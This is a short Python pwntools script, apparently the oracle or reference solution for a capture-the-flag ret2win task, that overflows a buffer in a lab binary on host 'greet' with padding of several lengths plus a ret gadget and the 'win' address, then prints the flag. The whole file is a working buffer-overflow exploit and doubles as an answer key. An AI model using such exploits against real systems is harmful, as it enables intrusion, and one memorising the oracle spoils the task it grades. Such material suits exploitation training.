#!/usr/bin/env python3
"""Oracle: ret2win. Static binary, no PIE/canary; musl needs 16-byte stack
alignment, so prepend a ret gadget. name[72] lands at offset 88 on this build."""

from pwn import ELF, ROP, context, p64, remote

context.log_level = "error"
context.arch = "amd64"
e = ELF("/work/vuln/vuln", checksec=False)
win = e.symbols["win"]
ret = ROP(e).find_gadget(["ret"])[0]
for off in (88, 80, 72, 96):
    for chain in (p64(ret) + p64(win), p64(win)):
        try:
            r = remote("greet", 9999, timeout=10)
            r.recvline()
            r.sendline(b"A" * off + chain)
            out = r.recvall(timeout=5).decode(errors="replace")
            r.close()
            if "flag{" in out:
                print(out)
                raise SystemExit(0)
        except SystemExit:
            raise
        except Exception:
            continue
print("oracle failed")
raise SystemExit(1)
